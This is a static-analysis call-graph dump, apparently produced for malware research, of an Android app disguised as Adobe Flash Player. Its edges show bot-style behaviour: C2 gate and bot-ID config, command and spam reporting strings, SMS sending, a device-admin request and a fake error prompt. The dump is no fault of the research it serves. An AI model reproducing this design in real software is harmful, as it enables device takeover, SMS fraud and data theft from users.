VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)>(null, null) in <dummyMainClass: com.adobe.flashplayer_.SystemSWF dummyMainMethod_com_adobe_flashplayer___SystemSWF(android.content.Intent)> ==> <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <java.lang.StringBuffer: void <init>()> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotLocation", $r2) in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r19) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke r3.<android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/ADOBEcoreZa;") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void <init>()>() in <com.adobe.packages.BK: void <init>()> ==> <android.app.Activity: void <init>()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: $r17 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.StringBuffer: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>($r4) in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <java.io.OutputStreamWriter: void <init>(java.io.OutputStream)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r8 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=file&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r25 = virtualinvoke $r21.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r29) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: $r17 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("Reich_ServerGate") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.app.Activity: void onDestroy()>() in <com.adobe.flashplayer_.FlashARM: void onDestroy()> ==> <android.app.Activity: void onDestroy()>
SPECIAL edge: specialinvoke $r57.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: r4 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r13 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke $r3.<java.lang.String: boolean equals(java.lang.Object)>($r4) in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $l4 = virtualinvoke r3.<java.io.File: long length()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: long length()>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashW: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke $r6.<com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>(r0) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <com.adobe.flashplayer.Certificate$1: void <init>(com.adobe.flashplayer.Certificate)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r19) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: $r5 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
STATIC edge: $r44 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i2) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke r2.<android.content.Intent: void <init>(java.lang.String)>("android.app.action.ADD_DEVICE_ADMIN") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.Intent: void <init>(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
CLINIT edge: staticinvoke <android.os.AsyncTask: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <android.os.AsyncTask: void <clinit>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.MacrosStat: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.MacrosStat: android.os.IBinder onBind(android.content.Intent)> ==> <com.adobe.flashplayer_.MacrosStat: android.content.Intent getIntent()>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashURL dummyMainMethod_com_adobe_flashplayer___FlashURL(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
CLINIT edge: staticinvoke <java.lang.Long: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Long: void <clinit>()>
VIRTUAL edge: $r4 = virtualinvoke $r6.<com.adobe.flashplayer.Certificate: android.content.Context getApplicationContext()>() in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.content.ContextWrapper: android.content.Context getApplicationContext()>
VIRTUAL edge: virtualinvoke r3.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)> ==> <java.io.Writer: void write(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.content.BroadcastReceiver: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void <init>()> ==> <android.content.BroadcastReceiver: void <init>()>
SPECIAL edge: $r9 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotVer", $r4) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.String: boolean contains(java.lang.CharSequence)>("OFF") in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("Reich_ServerGate", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, "loadSpam:Executed", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("remoteSD") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashZ: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: android.content.Intent getIntent()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.String: boolean contains(java.lang.CharSequence)>("A") in <com.adobe.flashplayer_.AdobeUtil: void execMod(java.lang.String,android.content.Context)> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r7 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r20 = virtualinvoke r4.<java.lang.StringBuffer: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.String toString()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("in", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: $r5 = staticinvoke <android.widget.Toast: android.widget.Toast makeText(android.content.Context,java.lang.CharSequence,int)>($r4, "Deleting error.\n\nWrong password of local storage. Please, try again.", 1) in <com.adobe.flashplayer.Certificate$2: void onClick(android.view.View)> ==> <android.widget.Toast: android.widget.Toast makeText(android.content.Context,java.lang.CharSequence,int)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r5, $r17, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Throwable: void <init>()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
SPECIAL edge: $r12 = specialinvoke r0.<com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r1) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: $r14 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotID") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
STATIC edge: $r36 = staticinvoke <java.lang.Class: java.lang.Class forName(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.Class: java.lang.Class forName(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $z0 = virtualinvoke r30.<java.lang.String: boolean equals(java.lang.Object)>("mounted") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>(r25, r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r21 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("*", "S") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $i0 = virtualinvoke r8.<java.lang.String: int indexOf(java.lang.String)>("keySmsGate") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("sendSMS[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r1) in <com.adobe.flashplayer_.FlashY: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
